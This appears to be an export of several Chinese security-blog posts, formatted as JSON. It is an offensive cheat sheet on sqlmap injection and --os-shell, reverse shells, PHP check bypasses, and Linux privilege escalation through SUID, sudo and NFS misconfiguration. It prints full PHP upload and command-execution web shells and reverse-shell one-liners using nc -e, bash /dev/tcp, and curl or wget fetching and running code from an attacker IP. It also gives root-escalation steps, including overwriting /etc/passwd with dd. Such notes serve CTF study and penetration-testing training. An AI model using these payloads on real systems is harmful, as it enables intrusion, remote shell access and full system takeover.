转储数据库管理系统的数据库中的表项\n–dump-all 转储所有的 DBMS 数据库表中的条目\n–search 搜索列，表和/或数据库名称\n-D DB 要进行枚举的数据库名\n-T TBL 要进行枚举的数据库表\n-C COL 要进行枚举的数据库列\n-U USER 用来进行枚举的数据库用户\n–exclude-sysdbs 枚举表时排除系统数据库\n–start=LIMITSTART 第一个查询输出进入检索\n–stop=LIMITSTOP 最后查询的输出进入检索\n–first=FIRSTCHAR 第一个查询输出字的字符检索\n–last=LASTCHAR 最后查询的输出字字符检索\n–sql-query=QUERY 要执行的 SQL 语句\n–sql-shell 提示交互式 SQL 的 shell\n\nBrute force(蛮力)这些选项可以被用来运行蛮力检查。\n–common-tables 检查存在共同表\n–common-columns 检查存在共同列\n\nUser-defined function injection（用户自定义函数注入）这些选项可以用来创建用户自定义函数。\nUser-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。\n–udf-inject 注入用户自定义函数\n–shared-lib=SHLIB 共享库的本地路径\n\nFile system access（访问文件系统）这些选项可以被用来访问后端数据库管理系统的底层文件系统。\nFile system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。\n–file-read=RFILE 从后端的数据库管理系统文件系统读取文件\n–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件\n–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径\n\n[*]Operating system access（操作系统访问）这些选项可以用于访问后端数据库管理系统的底层操作系统。\n–os-cmd=OSCMD 执行操作系统命令\n–os-shell 交互式的操作系统的 shell\n–os-pwn 获取一个 OOB shell，meterpreter 或 VNC\n–os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC\n–os-bof 存储过程缓冲区溢出利用\n–priv-esc 数据库进程用户权限提升\n–msf-path=MSFPATH Metasploit Framework 本地的安装路径\n–tmp-path=TMPPATH 远程临时文件目录的绝对路径\n\n-os-shell的使用https://xz.aliyun.com/t/7942\nhttps://blog.csdn.net/qq_61237064/article/details/124154956\n使用前提\n\n拥有网站的写入权限\n\nSecure_file_priv参数为空或者为指定路径\n\n满足条件后\n1.注入先对注入点探测\nsqlmap -u http://127.0.0.1/sqli-lab/less-1/?id=1\"\n\n\n然后执行--os-shell\nsqlmap -u http://127.0.0.1/sqli-lab/less-1/?id=1\" --os-shell\n\n\n选择php语言\n\n接着这个参数是选择绝对路径\n\n选项一为用这几个路径\n\n选项二为用户自己输入\n\n选项三为用用户的字典\n\n选项四为爆破。\n\n我们满足前提的话，选择2，直接输入自己知道的路径\n\n到这就完成了--os-shell的执行，来看看在sqlmap的执行效果\n对于上传的两个文件tmpugvzq.php和tmpbylqf.php我们在数据包中就可以看到，只需要解码就可以得到内容\ntmpugvzq.php\n0x0x\nif (isset($_REQUEST[\"upload\"]))&#123;\n\t$dir=$_REQUEST[\"uploadDir\"];\n\tif (phpversion()&#x27;4.1.0&#x27;)\n\t\t&#123;\n\t\t\t$file=$HTTP_POST_FILES[\"file\"][\"name\"];\n\t\t\t@move_uploaded_file($HTTP_POST_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();\n\t\t&#125;\n\t\telse&#123;\n\t\t\t$file=$_FILES[\"file\"][\"name\"];\n\t\t\t@move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();\n\t\t&#125;\n\t\t@chmod($dir.\"/\".$file,0755);\n\t\techo \"File uploaded\";\n\t&#125;\n\telse \n\t\t&#123;\n\t\t\techo \".$_SERVER[\"PHP_SELF\"].\" method=POST enctype=multipart/form-data>sqlmap file uploaderto directory:  \";\n\t\t&#125;\n?>\n\n根据上面的mysql语句，不难看出这是利用into outfile写入文件\ntmpbylqf.php\n \n$c=$_REQUEST[\"cmd\"];\n@set_time_limit(0);\n@ignore_user_abort(1);\n@ini_set(\"max_execution_time\",0);\n$z=@ini_get(\"disable_functions\");\nif(!empty($z))\n    &#123;\n        $z=preg_replace(\"/[, ]+/\",&#x27;,&#x27;,$z);\n        $z=explode(&#x27;,&#x27;,$z);\n        $z=array_map(\"trim\",$z);\n    &#125;\nelse\n    &#123;\n        $z=array();\n    &#125;\n    $c=$c.\" 2>&1\\n\";\nfunction f($n)\n&#123;\n    global $z;return is_callable($n)and!in_array($n,$z);\n&#125;\nif(f(\"system\"))&#123;\n    ob_start();\n    system($c);\n    $w=ob_get_clean();\n&#125;\nelseif(f(\"proc_open\"))&#123;\n    $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);\n    $w=NULL;\n    while(!feof($t[1]))&#123;\n        $w.=fread($t[1],512);\n    &#125;\n    @proc_close($y);\n&#125;\nelseif(f(\"shell_exec\"))&#123;\n    $w=shell_exec($c);\n&#125;\nelseif(f(\"passthru\"))&#123;\n    ob_start();\n    passthru($c);\n    $w=ob_get_clean();\n&#125;\nelseif(f(\"popen\"))&#123;\n    $x=popen($c,r);\n    $w=NULL;\n    if(is_resource($x))&#123;\n        while(!feof($x))\n            &#123;\n                $w.=fread($x,512);\n            &#125;\n        &#125;\n        @pclose($x);\n    &#125;\n    elseif(f(\"exec\"))&#123;\n        $w=array();\n        exec($c,$w);\n        $w=join(chr(10),$w).chr(10);\n    &#125;\n    else&#123;\n        $w=0;\n    &#125;\n    echo\"$w\";?>\n\n这是一个用于命令执行的代码，命令执行后会将执行的结果输出。\n直接在网站访问这两个shell文件就可以看到了\n一个提供了一个上传文件的入口，一个提供了一个以cmd参数的命令执行窗口\n成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。\n\ntmpugvzq.php是可以上传\ntmpbylqf.php是可以执行命令\n\n【如果没看到，可以查看wireshark或者先bp抓包数据流并时刻开启监听】\n这个时候sqlmap主要做了三件事情：\n1、进行目标的一个基础信息的探测。\n2、上传shell到目标web网站上。\n3、退出时删除shell。\n\n\n\n2.Database数据库支持外连，通过Sqlmap执行--os-shell获取shell。\n必要条件：\n数据库支持外连\n\n数据库权限为SA权限\n\nMysql和sqlsever两者的情况不同，详细建议看文章学习\nWindows 注册表访问这些选项可以被用来访问后端数据库管理系统Windows 注册表。\n–reg-read 读一个Windows 注册表项值\n–reg-add 写一个Windows 注册表项值数据\n–reg-del 删除Windows 注册表键值\n–reg-key=REGKEY Windows 注册表键\n–reg-value=REGVAL Windows 注册表项值\n–reg-data=REGDATA Windows 注册表键值数据\n–reg-type=REGTYPE Windows 注册表项值类型\n\nGeneral（一般）这些选项可以用来设置一些一般的工作参数。\n-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中\n-s SESSIONFILE 保存和恢复检索会话文件的所有数据\n–flush-session 刷新当前目标的会话文件\n–fresh-queries 忽略在会话文件中存储的查询结果\n–eta 显示每个输出的预计到达时间\n–update 更新 SqlMap\n–save file 保存选项到 INI 配置文件\n–batch 从不询问用户输入，使用所有默认配置。\n\nMiscellaneous（杂项–beep 发现 SQL 注入时提醒\n–check-payload IDS 对注入 payloads 的检测测试\n–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS\n–forms 对目标 URL 的解析和测试形式\n–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果\n–page-rank Google dork 结果显示网页排名（PR）\n–parse-errors 从响应页面解析数据库管理系统的错误消息\n–replicate 复制转储的数据到一个 sqlite3 数据库\n–tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址\n–wizard 给初级用户的简单向导界面\n\n制定测试的种类–technique=TECH SQL注入技术测试（默认 BEUST）\nTechniques（技巧）：\n–technique 测试指定注入类型使用的技术\n\n\n不加参数默认测试所有注入技术:\nB: 基于布尔的 SQL 盲注\nE: 基于显错 sql 注入\nU: 基于 UNION 注入\nS: 叠层 sql 注入\nT: 基于时间盲注\n\nsqlmap 判断wafsqlmap -u \"http://www.test.com/\" --identify-waf --batch\n\n一般注入流程以mysql为例\n1.验证注入\nsqlmap -u “注入点URL”\n\n从中可以发现存在注入的类型，数据库类型和web应用程序PHP和Apache等版本信息。\n2.列举数据库名\nsqlmap -u \"注入点\" --dbs\nsqlmap -u \"注入点\" --current-db  #列举当前使用的数据库\n\n3.查询某一数据库的所有表名\nsqlmap -u \"注入点\" -D 数据库名 --tables\n\n4.列举这一数据库的表的所有列（字段）\nsqlmap -u \"注入点\" -D 数据库名 -T 表名 --columns\n\n5.暴字段内容\nsqlmap -u \"注入点\" -D 数据库名 -T 表名 -C \"要爆的字段名\" --dump\n\n爆一个字段的话可能会很慢或者出错，全部暴出最好。\n可以在后面加个 –batch 可以不用手动选择yes或no的选项。\nsqlmap tamper 的使用可以进行各种绕过防火墙和waf\n--tamper xxx.py  (.py可以不加)\n\neg:python sqlmap.py -u “” – tamper base64encode.py1.普通的tamper搭配方式:\ntamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,\ncharencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,\nnonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,\nspace2randomblank,unionalltounion,unmagicquotes\n\n2.数据库为MSSQL的搭配方式：\ntamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,\nnonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,\nspace2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,\nunmagicquotes\n\n3.数据库为Mysql的搭配方式:\ntamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,\ngreatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,\nmultiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,\nspace2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,\nversionedkeywords,versionedmorekeywords,xforwardedfor\n\n4.常用脚本用法：\n\n\n\n\n\n\n\n\n\napostrophemask.py UTF-8编码apostrophenullencode.py unicode编码appendnullbyte.py 添加%00base64encode.py base64编码between.py 以”not between”替换”&gt;“bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“chardoubleencode.py 双重url编码charencode.py url编码charunicodeencode.py 对未进行url编码的字符进行unicode编码equaltolike.py 以”like”替代”=“halfversionedmorekeywords.py在每个关键字前添加条件注释ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)”modsecurityversioned.py 条件注释modsecurityzeroversioned.py 条件注释，0000multiplespaces.py 添加多个空格nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。）percentage.py 在每个字符前添加百分号（%）randomcase.py 随即大小写randomcomments.py 随机插入区块注释sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。）space2comment.py 以区块注释替换空格space2dash.py 以单行注释”–”和随机的新行替换空格space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格space2morehash.py 没看出来和上面那个有什么区别。。space2mssqlblank.py 以随机空白字符替换空格space2mssqlhash.py 以单行注释”#”和新行替换空格space2mysqlblank.py 以随机空白字符替换空格space2mysqldash.py 以单行注释和新行替换空格space2plus.py 以”+”替换空格space2randomblank.py 随机空白字符替换空格unionalltounion.py 以”union all”替换”union”unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”–”versionedkeywords.py 对不是函数的关键字条件注释versionedmorekeywords.py 对关键字条件注释\n","slug":"tooluse(sqlmap)","date":"2023-02-13T13:59:11.150Z","categories_index":"daily","tags_index":"tools","author_index":"Ttoc"},{"id":"9b02ce479705b9f09b692586eea96671","title":"反弹shell","content":"监听，弹弹弹\n\n\n反弹shell姿势netcat 一句话反弹获取shell（想反弹谁的shell就在谁的后面加-e /bin/sh或-e /bin/bash）\n正向shell 客户端主动连接服务器并获取服务器shell\n客户端主动连接并得到反弹shell    \n    nc 服务端ip 8888\n服务端监听连接\n    nc -lvp 8888 -e /bin/sh \n    # windows上：nc -lvp 8888 -e c:\\windows\\system32\\cmd.exe\n\n反向shell服务器端连接并反弹shell给客户端\n客户端监听\nnc -lvp 8888 \n服务端连接客户端\nnc 客户端ip 8888 -e /bin/sh \n\nwindows上：nc ip 8888 -e c:\\windows\\system32\\cmd.exe\n\nbash反弹shellbash -i >& /dev/tcp/我们靶机ip/我们靶机 port 0>&1\n\nbash一句话命令详解以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下\n\n\n\n\n\n\n\n\n\n\n其实以上bash反弹一句完整的解读过程就是：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。\n在反弹shell时要借助netcat工具反弹\ncurl反弹shell前提要利用bash一句话的情况下使用curl反弹shell\n在存在命令执行的服务器上执行\ncurl [自己的服务器]ip|bash\n//在利用curl里执行我自己的服务器上的bash一句话\n\n该ip的index文件上含有bash一句话，就可以反弹shell。\n例如在自己的服务器index文件上写上一句话\nbash -i >& /dev/tcp/192.168.20.151/7777 0>&1\n\n 192.168.20.151就是作为监听端口的服务器【攻击机】用来得到反弹的shell。\n\n 存在一句话，利用curl反弹。kali开启监听\n\nwget方式反弹shell利用wget进行下载执行\nwget 192.168.20.130/shell.txt -O /tmp/x.php && php /tmp/x.php\n\n利用下面贴出的php进行反弹。开启监听\n \n","slug":"Reverses-shell","date":"2023-02-13T13:56:59.573Z","categories_index":"daily","tags_index":"提权","author_index":"Ttoc"},{"id":"512d30341a0844883020fd5a4d84d838","title":"PHP函数记录","content":"还是挺重要的\n\n\nPHP函数记录1)php函数md5\n\n\n\n\n\n\n\n\nps.sha1，由于此函数依赖的算法已不足够复杂,不推荐使用此函数对明文密码加密。目前大多用md5\n但是和md5一样，sha1函数无法处理数组，遇到数组会返回NULL\n做题时，了解到了一个新的函数md5\n\n\n\n\n\n\n\n\n\nphp md5函数介绍为：\nmd5( string , raw )\nstring : 规定需要计算的字符串\nraw : 规定十六进制或二进制输出格式。\n​        true：16字符二进制格式\n​        false(默认): 32字符十六进制数\n比较常用的\n数字型：129581926211651571912466741651878684928\n\n字符型：ffifdyop\n\n发现都有’or‘的形式，可以构造必真的结果\n\n\n\n\n\n\n\n\n\nMD5函数有一个漏洞，当输入的为数组时，会返回为NULL\n所以当遇到md5(p1)&#x3D;&#x3D;&#x3D;md5(p2)，把p1和p2进行强比较时，又要求p1和p2不相等\n由于两个不同的字符MD5值很难一致，于是输入p1[]和p2[]两个名字一致的字符，随便赋值，p1[]&#x3D;1&amp;p2[]&#x3D;2返回为空，使得强比较成立\n\n为什么会这样呢我想起之前的遇到一个题，也有数组，问了一下大佬\n大佬说，因为没有对数组中的元素数量声明，函数不知道数组元素第几个的值是1（或2）导致函数到处扫，最后返回NULL【因为这个元素位置我们根本就没定】\n下面举几个例子，以我个人理解如果是p1[0]&#x3D;1&amp;p2[0]&#x3D;2是可以的，因为只定义了0号位的数据，而且不相等，其他位置数据没定义，所以比较也不可能出现相等\np1[0]&#x3D;1&amp;p2[1]&#x3D;1是可以的，因为这里p1[]定义了0号位为1，而p2定义的是1号位为1，比较是按顺序比较的，两个数值虽然一样，但是位置不一样，所以比较还是不相等\n下列的字符串的MD5值都是0e开头的：\n\n QNKCDZO\n 240610708\n s878926199a\n s155964671a\n s214587387a\n s1091221200a\n\n2)php函数ereg，null截断此函数在 PHP 5.3.0中已弃用，并在PHP 7.0.0中删除。\n[所以遇到无法执行时，可能是出题人没有注意部署题目环境]\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 \n\nereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配\n\n比如\nereg (\"^[a-zA-Z]+$\", $_GET[&#x27;c&#x27;])\n\n当c=a%00123时\nereg只会检测到第一个a为止，后面的数据都被%00截断了，从而绕过匹配\n\n所以现在一般不再使用ereg，只是做为preg_match替代函数使用\n3)php函数sleep\n\n\n\n\n\n\n\n\n当遇到这种需要我们输入参数，但是让参数值必须很大，\n而且最后又以这个参数执行sleep函数，就会让我们等很久\nsleep((int)$time)\n\nsleep()要延缓其程序执行的时间。\n但是我们又不能等太久，可以构造php中的科学计数法绕过，就构造一个  \n\n\n\n\n\n\n\n\n\ntime=0.3e7 （等价于0.3乘10的7次方） \n这样它的值达到了判断的标准。\n而且当它强制转化为整数型(int)的时候就会因为开头为0.3是小数变成零，这样可以满足条件。\n4)php函数is_numeric()当遇到类似\n\n\n\n\n\n\n\n\n\n0e..;1e;..2e..;...\n函数会把其当作科学计数法\n这样当遇到\nif ($num == 0) &#123;\n    if($num)&#123;\n            if(!is_numeric($time))\n\n这种\n\n\n\n\n\n\n\n\n\n第一个要弱类型为0\n第二个要不为0才能执行真的判断\n第三个要求其为数字\n就可以用类似0e2，绕过这三个\n5)eval()函数和system()函数的比较记录一次在打靶机时，因为平常习惯用 eval()函数，但是靶机执行nc等命令时，eval()函数没有反应，就是因为其是代码执行，而非命令执行，所以把两者本质的用法搞懂还是很必要的\n\n\n\n\n\n\n\n\n\neval类型函数是代码执行而不是命令执行（一句话木马）\nsystem类型函数是命令执行而不是代码执行\neval函数里必须是一个符合php语法的语句，如果语句结尾没有分号会报错：eval()’d code\n6)PHPのmb系列函数返回值\n\n\n\n\n\n\n\n\nhttps://github.com/php/php-src/issues/9008\n它会导致奇怪的结果。\n\n$string = \"PHP\";\n\nmb_detect_order([\"ASCII\",\"UTF-8\",\"BASE64\"]);\nvar_dump(\nmb_detect_encoding($string, null, true),\nmb_detect_encoding($string, mb_detect_order(), true),\n\nmb_convert_encoding($string, \"UTF-8\", \"BASE64\"),\nmb_strtolower($string, \"BASE64\"),\n?>\n\n得到的结果发现\nOutput for 8.2Output for 8.2.0\nstring(5) \"ASCII\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nOutput for 8.0.1 - 8.0.26, 8.1.10 - 8.1.13\nstring(5) \"ASCII\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nOutput for 8.1.0 - 8.1.9\nstring(6) \"BASE64\"\nstring(5) \"ASCII\"\nstring(2) \"\nstring(4) \"PHM=\"\n\nmb_detect_encoding($string, null, true)返回值\n只有在PHP版本在8.1.0 - 8.1.9时会返回base64，而在其他版本都是默认识别为ASCII\n\n\n\n\n\n\n\n\n\nmb_detect_encoding()这类的函数对内容进行编码的识别，就是匹配内容中的一些符合编码的字符，匹配成功对应编码加分，最后从头到尾匹配完成后，打分最高的编码就被认为是该内容的编码\n7)preg_match(‘&#x2F;^$&#x2F;‘)可以用%0a绕过，\n比如，\npreg_match(&#x27;/^123$/&#x27;,preg_match(&#x27;/^123$/&#x27;,$a)\n\n一般情况只有$a为123时才可以通过，但是用换行符号%0a\n就可以绕过\n\n","slug":"php-functions","date":"2023-02-13T13:51:57.927Z","categories_index":"daily","tags_index":"PHP","author_index":"Ttoc"},{"id":"d53bf67246a8c4a76e68bac4081733fd","title":"Linux特殊权限位","content":"linux提权学习\n\n\nLinux提权参考文章\n1）利用SUID提权什么是suid？\n\n\n\n\n\n\n\n\nSet User ID的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么这些文件&#x2F;程序&#x2F;命令可以以root权限运行\nSUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源\n什么是SGID\n\n\n\n\n\n\n\n\nG的意思就是group，功能和suid基本不相同，唯一区别就是suid获得命令所属用户的身份和权限，而sgid是获取所属用户组的身份和权限\nSUID权限\n\n\n\n\n\n\n\n\n1，SUID权限只能设置二进制文件。\n2，命令执行者要有二进制文件的执行权。\n3，命令执行者执行二进制文件时会获得该程序的属主身份。\n4，SUID权限只在程序执行过程中有效。\n即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。\n\n*关键1.查看具有root用户权限的SUID二进制可执行文件\nfind / -perm -u=s -type f 2>/dev/null\n\n命令来查找拥有SUID权限的程序。\n\nperm指定权限，-u=s代表SUID权限，type指定文件类型，f表示常规文件\n\n2.已知的可用来提权的linux可执行的文件列表如下\nNmap、Vim、find、Bash、More、Less、Nano、cp\n\n\n提权（1）利用find获取root权限shellfind / -name filename -exec “/bin/sh” \\;\n\n\n\n\n\n\n\n\n\n\n这个filename，只要存在就行，目的是让find命令可以成功执行，后面的-exec就是加上命令\n这里find有suid权限，普通用户执行时，会变成root用户，执行&#x2F;bin&#x2F;sh命令时，会进入root用户，从而实现提权\n如果find没有suid权限，执行&#x2F;bin&#x2F;sh命令后，仍然是普通用户\n·&#x2F;为根目录·-name 按文件名查找·-exec 对匹配对象执行的命令，以;结束但是（;）是特殊字符，需要用（\\）转义\n（2）利用cp获取root权限shell\n\n\n\n\n\n\n\n\n以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。\n\n可以通过\nfind / -perm -u=s -type f 2>/dev/null\n\n命令来查找拥有SUID权限的程序。\n\n\n\n\n\n\n\n\n\n\n当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。\n首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd\n\n\n\n\n\n\n\n\n\n\n然后按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。\n\n\n\n\n\n\n\n\n\n\n添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。\n\n（3）利用Vim获取root权限shell\n\n\n\n\n\n\n\n\nvim在有SUID权限的情况下，也可用来进行提权操作。\n\n\n\n\n\n\n\n\n\n\n当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc&#x2F;sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：\ntest   ALL=(ALL:ALL) ALL\n\n\n\n\n\n\n\n\n\n\nvim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。\n随后sudo bash就会获取一个root的shell。\n\n（4）利用nmap获取root权限shell1.旧版\n\n\n\n\n\n\n\n\nnmap（2.02-5.21）存在交换模式，可利用提权\nnmap --interactive\n\n之后执行:\nnmap> !sh\nsh-3.2# whoami\nroot\n\nmsf中的模块为：\nexploit/unix/local/setuid_nmap\n\n2.新版\n\n\n\n\n\n\n\n\n较新版可使用 --script 参数：\n先写入一条命令\necho \"os.execute(&#x27;/bin/sh&#x27;)\" > getshell\n再--script参数，执行\nsudo nmap --script=getshell\n\n成功提权\n\n（5）利用脚本获取root权限shell\n\n\n\n\n\n\n\n\n除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。\n示例代码如下：\n#include#include\n#include\n#include\n\nint main()\n&#123;\n  setuid(geteuid());\n  system(\"/bin/bash\");\n  return 0;\n&#125;\n\n使用gcc进行编译。\n\n编译后传入目标机，这里放到bin&#x2F;aaa目录下，然后添加SUID权限测试。\n\n普通用户执行该文件后，会返回一个root权限的shell。\n\n2）利用SUDO提权sudo和su的区别\n\n\n\n\n\n\n\n\n1，sudo是以root权限去运行一个命令，su是去切换用户的身份。\n2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。\nsudoers文件\n\n\n\n\n\n\n\n\n&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。\n例如添加test用户的相关配置：\n\n格式如下：\n\nsudo su &amp;&amp; sudo bash\n\n\n\n\n\n\n\n\n当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。\n\n\n\n\n\n\n\n\n\n\n或者执行sudo bash。\n\n\n\n\n\n\n\n\n\n\n当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。\n*SUDO -dd 提权法原文            \n\n\n\n\n\n\n\n\n\n当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始&#x2F;etc&#x2F;passwd文件，以达到修改密码的目的\n1、创建一个已知密码的hash，以备替换时使用\nhh@hh:/etc$ openssl passwd -1 -salt 123 password \n$1$123$0HaaUtbhct/mZ/Q/KRa5a.\n\n2、备份原始passwd文件，以防修改错误时无法访问\n# cp /etc/passwd /tmp/passwd\n\n3、利用第一步里生成的hash构建新的passwd hash条目\nhh@hh:/tmp# cat passwd\nroot:$1$123$0HaaUtbhct/mZ/Q/KRa5a.:0:0:root:/root:/bin/bash\n\n4、使用dd覆盖原始passwd文件\nhh@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd \n3+1 records in \n3+1 records out\n1757 bytes (1.8 kB, 1.7 KiB) copied, 0.000397129 s, 4.4 MB/s\n\n5、使用刚才创建hash时使用的密码进行登录\nhh@hh:/tmp$su root\nPassword:\nroot@hh:/tmp#\n\n提权成功！\n*GIT输入sudo -l\n//列出目前用户可执行与无法执行的指令。\n\n\n就可以发现root以nopasswd【不需要密码】运行git命令\n原理是git存在缓存区溢出漏洞，\n在使用\nsudo git -p\n\n不需要输入root密码，即可以root身份执行这条命令\n操作如下\nsudo git -p     \n//-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令\n\n下面可以看看区别\n*注意1.窗口足够大\n可以看到显示完了，就有回到原处了\n2.窗口小一些\n下方就显示出:，等待输入\n**:是自带有的，不是输入的\n:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git\n进入root\ncd /root\n--\n当然也可以执行:!passwd root\n修改其密码\n然后su root登录也可\n\n1.执行命令，拿到root的shell$变成#成功\n\n2.修改密码，登录\n$变成#，成功登录\n\n其他命令也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。\n这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。\naaa  ALL=(ALL:ALL) /usr/bin/find,/usr/bin/perl,/usr/bin/python3,/usr/bin/less,/usr/bin/awk,/usr/bin/man,/usr/bin/vi\n\n这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。\n\n相关命令提权方式如下：\nfind\n\n\n\n\n\n\n\n\nexec参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用\\进行转义。\n\nperl\n\n\n\n\n\n\n\n\ne参数用来指定要运行的命令，然后使用linux的exec参数来调用bash。\n\npython\n\n\n\n\n\n\n\n\nc参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。\n\nless\n\n\n\n\n\n\n\n\n输入sudo less /etc/hosts命令浏览文件内容时，到底部输入!bash后回车，会获得一个root权限的shell。\n\n\nawk\n\n\n\n\n\n\n\n\n通过调用linux的system函数来打开bash。\n\nman\n\n\n\n\n\n\n\n\n通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。\n\n\n*vi\n\n\n\n\n\n\n\n\nsudo vi会进入vi默认页，输入:!bash回车，可进入root命令行。\n\n\n脚本\n\n\n\n\n\n\n\n\n如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。\n例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。\n\n参考代码：\n\n应用程序\n\n\n\n\n\n\n\n\n除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。\n\nenv\n\n\n\n\n\n\n\n\n通过env环境变量来获取root权限。\n\nftp\n\n\n\n\n\n\n\n\n通过ftp来进入bash获取root权限。\n\nsocat\n\n\n\n\n\n\n\n\n通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。\nsudo socat exec:&#x27;sh -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444\n攻击机执行：\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n\n\nscp\n\n\n\n\n\n\n\n\n还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。\n如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。\n\n黑名单情况\n\n\n\n\n\n\n\n\n如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。\n\n3) NFS配置不当导致提权NFS介绍\n\n\n\n\n\n\n\n\nNFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。\n这里以ubuntu为例，简单配置一下：\n首先安装nfs服务端：\nsudo apt-get install nfs-kernel-server\n\n安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：\n/home *(rw,no_root_squash)\n\n其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。\n随后重启相关服务：\n# nfs通过rpc通信，这里把rpcbind也重启下sudo /etc/init.d/rpcbind restartsudo /etc/init.d/nfs-kernel-server 